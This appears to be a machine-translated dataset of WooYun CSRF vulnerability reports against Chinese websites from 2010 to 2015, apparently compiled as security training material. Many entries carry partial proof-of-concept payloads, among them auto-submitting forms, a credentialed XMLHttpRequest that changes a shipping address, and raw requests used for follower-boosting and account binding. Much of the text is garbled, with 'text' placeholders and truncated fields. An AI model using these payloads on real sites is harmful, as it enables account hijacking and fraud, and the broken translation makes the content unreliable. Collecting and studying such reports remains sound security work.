**Fix**: addtokenandvalidationrefer
---

---
### [wooyun-2013-044252] a certain Internet companytranslated textone locationcsrfvulnerability(textprove)
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textpointentercome,thentextnottextI,Itranslated textcomeaftertextunder,text,no

**POC**: textpointentercome,thentextnottextI,Itranslated textcomeaftertextunder,text,no

**Bypass**: Direct exploitation

**Fix**: 1:gettranslated textpostdataandtoken2:impact:translated textistranslated text,textcancantextbackup,textheart,textafterItextwilltranslated text...textistranslated textwhentext,a certain Internet companytextnottogether
---

---
### [wooyun-2013-032723] look atItextresetBaofeng Videoaccountpassword(needtextusertext)
**Vendor**: Baofeng Video | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,issueappearinpersonalinheartemailvalidationfunctionalityon:https://example.com/[redacted]

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: translated textscrfthengood
---

---
### [wooyun-2011-03393] a certain video sitetexthasCSRF vulnerability
**Vendor**: a certain video site | **Year**: 2011 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: norestrictiontextortextonevideo

**POC**: https://example.com/[redacted]"videoId": "XMzE1ODYzOTEy", "type": "down"}modifyitsindownasup,againurltextcode,textquestionthislinkthencantextonetext,cannorestrictiontextortexthttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: modifyaspostrequest,addtextpasswordinformation,one timesonetext
---

---
### [wooyun-2010-0198] DoubantextconsoleauthenticationBypassandcsrftranslated textBypassvulnerability
**Vendor**: Douban | **Year**: 2010 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Doubantextconsoleauthenticationas follows:https://example.com/[redacted]'https://example.com/[redacted]';itsinsigputastextauthentication,textdirectly

**POC**: <script src="https://example.com/[redacted]" from="80sec"></script>

**Bypass**: filterBypass

**Fix**: modifyauthenticationtextoraddtextfortextquestionurltext
---

---
### [wooyun-2015-0108586] translated textcan modifytextuserinformation(csrf)
**Vendor**: www.shiwan.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: whentextuserconstructformmodifyafter

**POC**: exploittextwhentextwillif modifyinformation,textpoint textmodifytextid  textwb

**Bypass**: Direct exploitation

**Fix**: serioussource texttoken
---

---
### [wooyun-2013-017169] a certain social platforma certain social platformtextone locationCSRFboost followers
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: noforreferervalidation,noaddtokencausing

**POC**: log ina certain social platforma certain social platformtextwilltext:https://example.com/[redacted] id="fxx" name="fxx" action="https://example.com/[redacted]" method="POST"><input type="text" name="uid" value="1981622273" /><input type="submit" value="submit" /></form><script>document.fxx.submit();</script></body></html>

**Bypass**: Direct exploitation

**Fix**: 1.thissitesametextisCSRFnottranslated text,textgoodothercheck;2.checkPOSTsourceReferer,inPOSTinformation add to token;3.translated text,requesting a reward!
---

---
### [wooyun-2013-026286] nofollowerscomeELLEintext!
**Vendor**: ellechina.com | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1:follow/add followasthistexttwo peoplenumber;idtextastext,text0;2:clickfollow/add followcapture packetstext,foundthisis justGETrequest,andtext2200458thenisuseridnumber,andtextnotextreferer:3:thatthencandirectlyconstructoneboost followersrequest:

**POC**: 4:then canfollowI:

**Bypass**: Direct exploitation

**Fix**: textreferer,addtoken
---

---
### [wooyun-2013-017347] Iistranslated texta certain social platformfollowers
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.textusea certain social platform,textfunctionalitytextpointtranslated textnicetext!textnottoItext5texta certain Internet companyaccounttextin,passwordtextbetext!text,nottext,is onefollow/add followinterfacehasissuetext!look:https://example.com/[redacted]

**POC**: 3.useIEbrowserlog intextonetranslated textaccount:texttotranslated textgoodlink,clickthen can,returnas follows:of courseeffecttexthas:4.itstextnotusethistranslated text,thisinterfacenoforCSRFtranslated text,directlyclicktextquestionthenwillaffected!butIastextthis kind ofGETmethodrequest,textvalidationreferer,textnotextfortext.aftertextvulnerabilitywilltextifhastextif!

**Bypass**: Direct exploitation

**Fix**: 1.critical requesttextistextposttextgood!2.critical requesttextisaddtokentextgood!3.reward, reward!busy at year end,textnottexta certain Internet companytext,translated textthis kind ofselfless spirit!textgirltext peopletranslated text!
---

---
### [wooyun-2015-0162486] pointIlinkIthencancanwillentertext51ctoaccount
**Vendor**: 51CTOtextwebsite | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 51ctobinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2015-0151798] translated textCSRFaddshipping address
**Vendor**: a certain security vendor | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1,https://example.com/[redacted] action="https://example.com/[redacted]" method="POST"><input type="hidden" name="id" value="" /><input type="hidden" name="receiver" value="fsdf" /><input type="hidden" name="mobilePhone" value="13888888888" /><input type="hidden" name="telPhone" value="" /><input type="hidden" name="provinceId" value="260" /><input type="hid

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: token
---

---
### [wooyun-2014-060493] translated text-a certain social platform OAuth 2.0 redirect_uri CSRF vulnerability
**Vendor**: translated text | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: translated text-a certain social platform OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartonetranslated text-a certain social platform  OAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted] translated textwilltextputuseraccountsameattackeraccountbindtoonetogether

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0125767] translated textunderwebsitetextCSRF vulnerability(textforwardtext)
**Vendor**: translated text | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: texton peopletextfollowonetext,sametextistextaddtokentextlook atcapture packetswithonPOCwetext peopleaccountlog in,thentextquestionpoc

**POC**: textquestionsuccess,forwardsuccess

**Bypass**: Direct exploitation

**Fix**: addtokenvulnerabilitytext impacttextlarge
---

---
### [wooyun-2014-072804] SiteServer_BBS_canCSRFsendtranslated text+text
**Vendor**: translated textsoftwaretranslated textsendhastranslated textcompany | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: sendtranslated textandtextinterfacetexthasissue/ajax/form.aspx?publishmentSystemID=1&action=addPost (text)/ajax/form.aspx?publishmentSystemID=1&action=postAllInOne (sendtranslated text)directlysendPOC:1.text<meta http-equiv=Content-Type content="text/html;charset=utf-8"><form id="addPostForm" action="http://[IP redacted] method="post"><input id="forumID" name="forumID" type="hidden" value="2"><input id="thre

**POC**: text:{"onlineTotal":"1 \u5206\u949F","userImageUrl":"/sitefiles/bairong/icons/avatars/atavar_middle_38.jpg","creationDate":"2014-08-16","prestige":0,"title":"CSRF TEST!","editUrl":"/post.aspx?forumID=2&threadID=1&postID=1011&postType=","userUrl":"/user.aspx?publishmentSystemID=1&userName=zphchina","er

**Bypass**: Direct exploitation

**Fix**: addtokenandtextreferer
---

---
### [wooyun-2015-092552] textintextCSRF vulnerability
**Vendor**: textintext | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: textCSRFchangedomain namednsserver,inusernottranslated textundermaliciouschangedomain nameparse

**POC**: textweneedintextintext,comeenterlinetest,welog inafter,wearbitrarytextone locationhasmodifypermissionstranslated text1,herethenuseburptruncationtranslated textmodifypasswordlocation,sametextcantruncationwecapture packetsfound,isPOSTtype,textnotokenvalidationtext,textwecanconstructcsrfcanconstructsubmitpage(packettextnottextforthistextlocation)1,https://example.com/[redacted] constructoneformhtmlpage1locationtextdomain name 2 ,3locationtextDNSaddressOK  constructtext!useonistranslated textnextistesttext,astextgoodtexteffect,weusetextonetext

**Bypass**: Direct exploitation

**Fix**: addvalidation
---

---
### [wooyun-2014-060499] text-a certain search engine OAuth 2.0 redirect_uri CSRF vulnerability
**Vendor**: Baihe | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: text-a certain search engine OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartonetext-a certain search engine  OAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2014-058804] a certain Internet companytextcommunityCSRF vulnerability2text(canboost followersandpopularity)
**Vendor**: a certain Internet company | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: No.oneCSRF vulnerability(boost followers):exploitCSRFconstructgoodURL:(itsinkeyasspecifiedcommunityid)https://example.com/[redacted] src=https://example.com/[redacted]"errCode":0,"message":"\u5df2\u9876","data":{"likeNumber":2},

**POC**: as above

**Bypass**: Direct exploitation

**Fix**: translated text!
---

---
### [wooyun-2013-034681] Tianyaa certain social platformmobile versionCSRFboost followers
**Vendor**: Tianyacommunity | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: wefollowuid=3615778user,look atlook atfollow/add followrequest:GET /action/follow.jsp?uid=3615778&vu=76821864657&idwriter=81847003&key=831533474&chk=635410373cd31bb22859f44a0a9ef60e HTTP/1.1Host: 3g.tianya.cnUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:22.0) Gecko/20100101 Firefox/22.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, defl

**POC**: see detailed description

**Bypass**: Direct exploitation

**Fix**: defensecsrf
---

---
### [wooyun-2013-043688] Dianping-look atlook atIistextagain timesboost followers
**Vendor**: Dianping | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted] - of courseberestriction,goodtranslated texthttps://example.com/[redacted]

**POC**: https://example.com/[redacted] - Itextdevelopertextonetextlowhttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: 1:controlgoodallinterface2:nottextputinputoutputselftextinwebpageinside3:comesendrewardput..
---

---
### [wooyun-2015-0162488] pointIlinkIthencancanwillentertextJumei Youpinaccount
**Vendor**: Jumei Youpin | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Jumei Youpinbinda certain social platformlog inrequestashttps://example.com/[redacted]

**POC**: textrecorded videohttps://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addcsrfprotectiona certain social platformbindtextusea certain social platformusernamedpasswordlog in
---

---
### [wooyun-2015-098349] translated textappearCSRF vulnerability cantextprofiletextfollowtranslated text
**Vendor**: Taomee | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: knownaffectedoperation:changeprofile,changepersonalinterests,setspacenamedname/description,follow/cancelfollowtext,sendtext/textdiarychangeprofilefollowtext:changepersonalintereststextdiarycantextsitetextimageURL,imagelinktextshortlinktextcanBypasslink?questionnumberfilter.coordinatethisvulnerabilitycancausediaryunlimitedtext,occurlarge amount ofjunkdata.

**POC**: (see original)

**Bypass**: filterBypass

**Fix**: sensitiveoperationnotuseGETrequest
---

---
### [wooyun-2013-017303] Itextistranslated texta certain social platforma certain social platformfollowers
**Vendor**: a certain social platforma certain social platform | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: 1.good,haspointTitletext,buttextistranslated text!intextvulnerabilitytextbefore,translated textonetranslated text,boost followerstranslated text:2.textissuesiteis:https://example.com/[redacted] /blog/api/attentionpost.php HTTP/1.1rialog=A0012&uid=[followersid]&aid=[followobjectid]&name=[cannottext]&is_follower=[cannottext]ontexttwo peopleParametersintranslated textisuid,thenisfollowersidnumber,textiscopy timesrequestaccountid,aidisfollowobject,textthenisneedboost followersthattranslated text!4.to demonstratevulnerabilityeffect,this timesInottextcloudboost followers,textisputtextcloudaccounttextIfollowers(oneistranslated textvulnerabilitytranslated text:Inotwilltextcontroltextclouda certain social platformfor,twoistranslated textclouda certain social platformtranslated text,texteveryonethroughtranslated textfollowtextcloud).everyonetranslated textclouduidnumber

**POC**: 7.ifIputcopy timesPOSTrequestsendtextburpsuiteintrudermodule,uidsettext10textnumbertranslated text,Iwilltranslated textfollowerstext?

**Bypass**: Direct exploitation

**Fix**: Itrytriedhow many timesfailedtexthasthisone timesfound!
---

---
### [wooyun-2012-012539] a certain social platforma certain social platformone locationCSRF vulnerability
**Vendor**: a certain social platform | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: inacceptPOSTandGETinformationwhen,notforPOSTsource(Referer)verify,also does notinPOSTinformation add to tokenvalidationinformationcorrectness,causingvulnerabilityoccur.

**POC**: vulnerabilityaddress:https://example.com/[redacted] id="imlonghao" name="imlonghao" action="https://example.com/[redacted]" method="post"><input type="text" name="product" value="weibo" /><input type="text" name="ac" value="send" /><input type="text"

**Bypass**: Direct exploitation

**Fix**: checkPOSTsourceRefererinPOSTinformation add to token
---

---
### [wooyun-2013-017487] DX2.5one locationoperationnotvalidationHASH,canCSRFfastscore boosting!
**Vendor**: a certain Internet company | **Year**: 2013 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: scorelocationnotvalidationHASH,inpersonaltextnamedorreplycontentinusetextimagefunctionalitytextscorelink,textopenpackettextthisimagepostthenwilltranslated textspecifiedpostaddtext.[img]https://example.com/[redacted]

**POC**: https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: validationHASH
---

---
### [wooyun-2014-074874] Kelin mobile self-service site-building systemmulti-aspectuniversalCSRF
**Vendor**: Kelin mobile self-service site-building system | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: admin backendmanagement

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: a certain search enginekeywordinurl:wapindex.aspxtextofficialwebsitehttps://example.com/[redacted]  eighttranslated textauthorwebsite,wapzz mobile phonesitetextoftextundertextstarttext.thenusewww.wapzz.cntextexampleaftertextaddadmin/addTopWAPALL.aspx?path=360databasewith plan&action=gomod&classid=0texturltextcodetextwww.wapzz.cn/admin/addTopWAPALL.aspx?path=360%E5%BA%93%E5%B8%A6%E8%AE%A1%E5%88%92&action=gomod&classid=0administratortextquestionthislink,websitehomepagethenwilltextas360databasewith plan.textcandirectlyusesimplifiedlinkwww.wapzz.cn/admin/addTopWAPALL.aspx?path=360databasewith plan&action=gomod&classid=0againfor examplethisht

**POC**: canconstructchainexample,https://example.com/[redacted]

**Bypass**: encoding bypass

**Fix**: userandadministratorcanoperationpermissionsallcanconstructCSRFchain,youthissite-building systemtextirresponsible.thispenalty
---

---
### [wooyun-2014-049660] CSDNblogmanagementCSRF vulnerability
**Vendor**: CSDNdevelopercommunity | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: deletearticleurlcompletelyexposetextotheruser,allisthis kind ofform:https://example.com/[redacted] Bsimulation)1.textlook atAusersendtextonetextarticle:https://example.com/[redacted]):3.but,wecan"text"textthisdeletearticleURL:CSDNblogdeletearticlelinkonetext

**POC**: userAclickuserBbloginsideimageafter,againtextlook atthistextarticle:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: youtextItext!
---

---
### [wooyun-2014-076080] Discuz!Xoneaswantascsrf+hpp(sitedatabase dump,arbitrary filesfileoperation,directorytraversal,cancanothercmstextintext)
**Vendor**: Discuz! | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: thisvulnerabilitycomes fromdzcompanyucenter,thisucenter,shouldisindatadatabasebackupoperationwhen,notextcsrfdefensecancausingdzbefileoperation,database dumpetc.etc.,startanalysis:nextweanalysiscode:uc_server\control\admin\db.php:(85-ll6line):function onoperate() {require_once UC_ROOT.'lib/xml.class.php';$nexturl = getgpc('nexturl');$appid = intval(getgpc('appid'));$type = getgpc('t') == 'import' ? 'import' : 'export';$backupdir = getgpc('backupdir');$app = $this->cache['apps'][$appid];if($nexturl) {$url = $nexturl;

**POC**: (see original)

**Bypass**: filterBypass, truncationattack

**Fix**: Strengthen input validation
---

---
### [wooyun-2015-0103414] Oxygen app CSRFcanbatch favorite
**Vendor**: o2bra.com | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: favoritewhen,POSTas followsrequest:modifyid=2:successreceipt:

**POC**: exploitononevulnerability,canchecklook atarbitraryidfollowproductURL:https://example.com/[redacted]

**Bypass**: Direct exploitation

**Fix**: addtoken
---

---
### [wooyun-2013-038016] a certain security vendorone locationfunctionalitycsrf(shop favorites can be boosted)
**Vendor**: a certain security vendor | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: https://example.com/[redacted]

**POC**: heretexthasonesendcantext.textforbeblack hatsexploitaftertextwethendo not know. text,butcantextthatsomenottext. beblack hatsexploitthennotgoodtext..of course360youtextintranslated textfor,thiscompletelycantextiscanusetotext,thengoodtextItextuserBtranslated textoneXXX, coinsas:998988   of coursetextwillputaccountpasswordsendcome,aftertranslated text,translated textthentext,textnottextinsidetexthascoins,textpoints lottery, translated textstart...social engineeringtextlarge,nottext common passwordItextnottext, youcustomersecuritytext... textselftext~  translated textfor moneytextalltext,translated text...

**Bypass**: Direct exploitation

**Fix**: 1:textpostsubmit,thentoken ,usetextbetextcsrf2:ItextiscometextAnzai...3:then.. text.. textonepersonalcompletelycantextnotistext,textwilltextistext,translated text..4:beforetextuseidtext,thenscreenshot,texthastextuseasistext- - Inotext.. brother.iPadtemptationforfor90aftershouldtextlarge
---

---
### [wooyun-2012-014880] a certain search enginegame CSRF,addadd friendstextnotisdream
**Vendor**: a certain search engine | **Year**: 2012 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: igamein,add friends,publishmessage,nottextcsrfcheck,textusepost,textsametranslated textget.sametext,forreferernottextsufficientcheck.igamesendmessage,nottextimageandlink,so,textaswormtranslated textafteronetext,nottextthroughforumcoordinate,textadd friends,useandtextpublishmessagenotextobstacle. enteronetextsendtext,shouldtexthasmoreinterestingfunctionality,Inottried,pointtoastext,youselftextcheck.

**POC**: 1.add friends. for convenience,textgametextnamedundertext.2.look atlook atgameineffect.3.look atthispostresult4.sendmessagesametextcsrfissue,Itoo lazy toagaintried.

**Bypass**: Direct exploitation

**Fix**: standard CSRF handling flow
---

---
### [wooyun-2010-0965] a certain social platformhas one-click repost postingcsrfvulnerability
**Vendor**: a certain Internet company | **Year**: 2010 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: Strengthen input validation
---

---
### [wooyun-2011-02161] RenrenGETmethodsubmitstatus vulnerability
**Vendor**: Renren | **Year**: 2011 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: secret crush:https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: putGETmethodtextasPOSTmethod
---

---
### [wooyun-2015-0121174] exploitCSRF vulnerabilityhijackmember account
**Vendor**: translated text | **Year**: 2015 | **Type**: design flaw/logic error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: design flaw/logic error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify design flaw/logic error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**:

**POC**: textwetextuseraffectedbindonIa certain emailservice,ItextoneSCRF.code is as follows:<html><head><title>scr poc</title></head><body><form action="https://example.com/[redacted]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40some-domain.com"></fo

**Bypass**: Direct exploitation

**Fix**: FixoneunderCSRF.
---

---
### [wooyun-2015-0163147] XCartwolocationissue(bindaccounttextarbitraryunbind)
**Vendor**: XCar.com.cn | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: issue1:accountinjectionafter,bindOAuthtext,no tokenvalidation,hascsrf.textthislocationtextaddtextstateParameters.related issueFixlook athttps://example.com/[redacted]  "targeting the application sidecsrfhijackNo.threetextaccount" section.issue2:mobile phonetextbindoperationcanbebrute force,addvalidationcodetext.

**POC**: issue1prove:no tokenorstateprotection,hascsrf.issue2prove:unbindmobile phoneno validationcodetext,hasbrute forceissue

**Bypass**: Direct exploitation

**Fix**: vulnerability1:related issueFixlook athttps://example.com/[redacted]  "targeting the application sidecsrfhijackNo.threetextaccount" section.specific fixreferencevulnerability2:addsubmitcodetextvalidationcodecheckfunctionality
---

---
### [wooyun-2015-092034] ZhujiwuCSRFchangedomain namemanagementpassword
**Vendor**: Zhujiwu | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: changetextpassworddoes not needvalidationold password.csrfthen cantext

**POC**: capture packetsscreenshot constructcsrfform

**Bypass**: Direct exploitation

**Fix**: changetextpasswordtextneedvalidationold password.
---

---
### [wooyun-2013-038432] a certain forumsystemmisconfigurationcancausingCSRFpost
**Vendor**: a certain forumsystem | **Year**: 2013 | **Type**: application configuration error

**Meta-thinking**: Trigger signal: functional testing

**Insight**: application configuration error lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify application configuration error-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: crossdomain.xmldefault setting:<?xml version="1.0"?>-<cross-domain-policy> <allow-access-from domain="*"/><!-- Flash cross-domain policy,domainrecommendsetas *.textsitedomain name --></cross-domain-policy>texthasrecommend butordinary webmastertranslated textthis,textnottextyouininstalltextdirectlytexthostrewriteundercrossdomain.xmltext.texttocsrftokenfunction gethash() {function getformhash(txt) {txt = txt.split('csrf_token" value="')[1].split('"')[0];return txt;}var result_lv:LoadVars = new LoadVars();result_lv.onData

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: delete that file,orrewrite,textdo not put it on the attacker side.
---

---
### [wooyun-2015-0124911] Benlai.com csrfone issue
**Vendor**: Benlai.com | **Year**: 2015 | **Type**: CSRF

**Meta-thinking**: Trigger signal: Parametersinjection, authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: log inaccountA,modifyitsshipping address,andcapture packetschecklook atitsshipping address,modifysuccess:requestaspost,textParameterscantext,trycsrf.constructlink,main code;xmlhttp.open("POST", "https://example.com/[redacted]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("checkNeighbor=0&AddressCount=2&sysno=1898189&txtBrief=jia1&province=1&city=2&district=10&txtStreet=fgdsgtesghth&txtZip=100000&txtName=woo&

**POC**: Same as above

**Bypass**: Direct exploitation

**Fix**: tokenvalidationrefer
---

---
### [wooyun-2014-054891] Ku6-Kaixin OAuth 2.0 redirect_uir CSRF vulnerability
**Vendor**: Ku6 | **Year**: 2014 | **Type**: CSRF

**Meta-thinking**: Trigger signal: authentication interface

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
1. Identify CSRF-related functionality
2. Construct a test payload
3. Verify the vulnerability response

**Details**: Ku6-Kaixin OAuth 2.0 during the authentication flowhttps://example.com/[redacted] CSRF attack.ifattackerrestartoneKu6-KaixinOAuth 2.0 authenticationrequest,andinterceptOAuth 2.0 authenticationrequestreturn.https://example.com/[redacted]

**POC**: (see original)

**Bypass**: Direct exploitation

**Fix**: 1. recommend effective measurestextresisttextforOAuth 2.0 redirect_uir CSRFattack.for example:a. force the user to re-enteraccountpassword,thenagainenterlinebindoperation.thisistextsinglehastextmethod.textcancanwillsacrifice user experience.b. Ku6canuse referer value validationcomeresisttextforOAuth 2.0 redirect_uir CS
---

---
### [wooyun-2013-028259] Autohomeforumcsrfboost followersvulnerability(Bypassimagesrcrestriction)
**Vendor**: Autohome | **Year**: 2013 | **Type**: CSRF

**Meta-thinking**: Trigger signal: functional testing

**Insight**: CSRF lacks sufficient protection; developers trust front-end input

**Test Flow**:
